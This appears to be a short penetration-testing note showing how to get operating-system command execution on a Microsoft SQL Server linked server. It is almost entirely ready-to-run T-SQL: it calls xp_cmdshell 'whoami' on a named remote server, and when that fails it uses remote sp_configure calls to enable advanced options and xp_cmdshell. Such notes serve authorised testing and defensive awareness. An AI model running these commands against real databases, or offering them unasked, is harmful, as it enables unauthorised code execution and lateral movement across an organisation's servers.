After discovering an linked Server we can test if command execution is possible:

```
EXEC ('xp_cmdshell ''whoami''') AT [ZSM-SVRCSQL02];
```

Not possible?

Activate xp_cmdshell remotely.

```
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [ZSM-SVRCSQL02];
```

```
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [ZSM-SVRCSQL02];
```

Now retry command:

```
EXEC ('xp_cmdshell ''whoami''') AT [ZSM-SVRCSQL02];
```